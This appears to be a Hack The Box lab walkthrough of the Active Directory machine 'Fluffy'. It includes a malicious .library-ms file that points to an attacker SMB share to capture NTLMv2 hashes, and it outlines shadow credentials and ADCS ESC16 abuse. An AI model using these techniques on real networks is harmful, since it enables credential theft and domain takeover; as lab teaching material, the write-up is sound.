> Writeup · part of **[htb-walkthroughs](../README.md)** · [⬇ original PDF](Fluffy.pdf)

---

# **SEASON 8: Active Directory → Fluffy** 

<u>https://www.hackthebox.com/machines/Fluffy</u> 

This is a season 8 box testing on AD enumeration and exploitation. Initial creds: **j.fleischman / J0elTHEM4n1990!** 

## **Nmap Scan output** 

- ➔ Having port 88 kerberos and 389 ldap, we now know we are attacking a Domain Controller. 

![](images/Fluffy-Sn8-HTB.pdf-0001-05.png)

## **ENUMERATION** 

## **1. SMB** 

Using smbmap, we are able to determine which shares we can read and right on. So we have read,write on IT share. 

![](images/Fluffy-Sn8-HTB.pdf-0002-00.png)

Using the initially given creds, we connect to  the IT share and proceed to download an upgrade notice file. 

![](images/Fluffy-Sn8-HTB.pdf-0002-02.png)

![](images/Fluffy-Sn8-HTB.pdf-0003-00.png)

``` 

Recent Vulnerabilities 

CVE IDSeverity 

CVE-2025-24996Critical 

CVE-2025-24071Critical 

CVE-2025-46785High 

CVE-2025-29968High 

CVE-2025-21193Medium 

CVE-2025-3445Low 

``` 

![](images/Fluffy-Sn8-HTB.pdf-0004-00.png)

## **A. CVE-2025-24996** 

![](images/Fluffy-Sn8-HTB.pdf-0004-02.png)

### **EXPLOITING THIS VULNERABILITY TO CAPTURE NTLMv2 Hash.** 

We’ll now create a .library-ms file e.g ``` ``` 

<?xml version="1.0" encoding="UTF-8"?> 

<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"> 

<name>Malicious Library</name> 

<version>6</version> 

<isLibraryPinned>false</isLibraryPinned> 

<iconReference>\\10.10.*.*\share\icon.ico</iconReference> 

<template>generic</template> 

<libraryType>Generic</libraryType> <searchConnectorDescriptionList> <searchConnectorDescription> 

<folderType>Generic</folderType> 

<iconReference>\\10.10.*.*\share\icon.ico</iconReference> 

<simpleLocation>\\10.10.*.*\share</simpleLocation> 

</searchConnectorDescription> 

</searchConnectorDescriptionList> 

</libraryDescription> ``` 

``` 

### Saved the file, and uploaded it to the target machine. 

![](images/Fluffy-Sn8-HTB.pdf-0005-13.png)

Used john to retrieve the cleartext password 

![](images/Fluffy-Sn8-HTB.pdf-0006-01.png)

Testing if this credentials are working on the target machine ‘ **p.agila:prometheusx-303** ’ 

![](images/Fluffy-Sn8-HTB.pdf-0006-03.png)

## **LDAP AND BLOODHOUND ENUMERATION** 

![](images/Fluffy-Sn8-HTB.pdf-0006-05.png)

Ldap output 

![](images/Fluffy-Sn8-HTB.pdf-0007-00.png)

### Checking if ADCS service is enabled 

![](images/Fluffy-Sn8-HTB.pdf-0007-02.png)

### Bloodhound dump output 

![](images/Fluffy-Sn8-HTB.pdf-0007-04.png)

p.agila is a member of service account managers and has generic all on service accounts members. 

![](images/Fluffy-Sn8-HTB.pdf-0008-00.png)

We’ll add p.agila into the service accounts group using net rpc tool. 

![](images/Fluffy-Sn8-HTB.pdf-0008-02.png)

![](images/Fluffy-Sn8-HTB.pdf-0008-03.png)

Now members in the service account have generic write to other members within this same group. 

![](images/Fluffy-Sn8-HTB.pdf-0009-00.png)

## **Shadow Credentials attack** 

Tool: pywhisker 

![](images/Fluffy-Sn8-HTB.pdf-0009-03.png)

### Requesting TGT 

![](images/Fluffy-Sn8-HTB.pdf-0009-05.png)

Retrieving the NTLM hash for user winrm_svc 

![](images/Fluffy-Sn8-HTB.pdf-0010-00.png)

## **USER FLAG** 

![](images/Fluffy-Sn8-HTB.pdf-0010-02.png)

## **PRIVILEGE ESCALATION** 

## **ADCS ABUSE** 

Finding vulnerable certificates: After a bit of enumeration, with user ca_svc, we are able to find vulnerable certificate templates using certipy 

![](images/Fluffy-Sn8-HTB.pdf-0011-00.png)

Using the previous steps of our SHADOW CREDENTIALS ATTACK, were are able to retrieve ca_svc hash with which we can use to find vulnerable certificate templates 

![](images/Fluffy-Sn8-HTB.pdf-0011-02.png)

![](images/Fluffy-Sn8-HTB.pdf-0011-03.png)

![](images/Fluffy-Sn8-HTB.pdf-0012-00.png)

### Retrieved the LM hash for user ca_svc 

![](images/Fluffy-Sn8-HTB.pdf-0012-02.png)

### Enumerating ADCS to find vulnerable certificates templates 

![](images/Fluffy-Sn8-HTB.pdf-0012-04.png)

Enumerating the ADCS using certipy to find vulnerable templates 

![](images/Fluffy-Sn8-HTB.pdf-0013-00.png)

## **ABUSING ESC16** 

Update the victim account's UPN to the target administrator's sAMAccountName.sAMAccountName 

![](images/Fluffy-Sn8-HTB.pdf-0013-03.png)

Request a certificate as the "victim" user from any suitable client authentication template _any suitable client authentication template_ 

![](images/Fluffy-Sn8-HTB.pdf-0013-05.png)

Authenticate as the target administrator. 

![](images/Fluffy-Sn8-HTB.pdf-0014-00.png)
